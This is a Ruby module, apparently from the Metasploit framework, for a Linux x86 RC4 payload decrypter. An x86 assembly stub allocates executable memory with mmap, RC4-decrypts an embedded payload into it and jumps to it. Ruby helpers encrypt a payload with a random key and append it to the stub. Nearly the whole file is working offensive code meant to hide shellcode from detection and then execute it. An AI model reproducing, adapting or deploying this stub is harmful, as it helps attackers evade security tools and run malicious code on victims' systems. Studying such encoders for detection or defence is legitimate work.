module Msf::Payload::Linux::X86::Rc4Decrypter

  def rc4_decrypter_stub
    asm = <<-ASM
_start:
      jmp _get_data_addr

_got_data_addr:
      pop ebp

      ; mmap(NULL, payload_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
      xor eax, eax
      push eax
      push 0xffffffff
      push 0x22
      push 7
      mov eax, dword [ebp+4]
      push eax
      xor eax, eax
      push eax
      mov al, 0x5a
      mov ebx, esp
      int 0x80
      add esp, 24
      push eax

      ; Allocate S-box (256 bytes) on stack
      sub esp, 256
      mov edi, esp

      ; Initialize S-box: S[i] = i for i = 0..255
      xor ecx, ecx
_init_sbox:
      mov byte [edi+ecx], cl
      inc cl
      jnz _init_sbox

      ; RC4 Key Scheduling Algorithm (KSA)
      xor esi, esi
      xor ebx, ebx

_ksa_loop:

      movzx eax, byte [edi+esi]
      add ebx, eax

      mov eax, esi
      xor edx, edx
      push ebx
      mov ecx, dword [ebp]
      div ecx
      pop ebx
      lea ecx, [ebp+12]
      movzx eax, byte [ecx+edx]
      add ebx, eax
      and ebx, 0xff

      movzx eax, byte [edi+esi]
      movzx ecx, byte [edi+ebx]
      mov byte [edi+esi], cl
      mov byte [edi+ebx], al

      inc esi
      cmp esi, 256
      jb _ksa_loop

      ;RC4 Pseudo-Random Generation Algorithm (PRGA)
      xor esi, esi                    
      xor ebx, ebx                    
      xor ecx, ecx

_prga_loop:

      inc esi
      and esi, 0xff

      movzx eax, byte [edi+esi]
      add ebx, eax
      and ebx, 0xff

      movzx eax, byte [edi+esi]
      movzx edx, byte [edi+ebx]
      mov byte [edi+esi], dl
      mov byte [edi+ebx], al

      add eax, edx
      and eax, 0xff
      movzx eax, byte [edi+eax]

      push ebx
      lea edx, [ebp+268]
      xor al, byte [edx+ecx]
      mov edx, dword [esp+260]
      mov byte [edx+ecx], al
      pop ebx

      inc ecx
      cmp ecx, dword [ebp+8]
      jb _prga_loop

      add esp, 256                    ; deallocate S-box
      pop eax                         ; eax = output buffer address
      jmp eax                         ; jump to decrypted payload

_get_data_addr:
      call _got_data_addr

; Data section layout (populated by rc4_decrypter):
; offset +0:   key_size (4 bytes)
; offset +4:   payload_size (4 bytes)
; offset +8:   encrypted_size (4 bytes)
; offset +12:  key_data (256 bytes)
; offset +268: encrypted_data (variable length)
    ASM

    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

  def rc4_decrypter(opts = {})
    key = opts[:key] || Rex::Text.rand_text(16)
    payload = opts[:data] || raise(ArgumentError, "Encrypted data required")

    encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)

    stub = rc4_decrypter_stub.dup
    code_size = stub.length

    key_size_offset = code_size
    payload_size_offset = code_size + 4
    encrypted_size_offset = code_size + 8
    key_data_offset = code_size + 12
    encrypted_data_offset = code_size + 268

    stub << "\x00" * 268

    stub[key_size_offset, 4] = [key.length].pack('V')
    stub[payload_size_offset, 4] = [payload.length].pack('V')
    stub[encrypted_size_offset, 4] = [encrypted_data.length].pack('V')
    stub[key_data_offset, 256] = key.ljust(256, "\x00")

    stub + encrypted_data
  end

  def stub_size
    rc4_decrypter_stub.length + 268
  end

end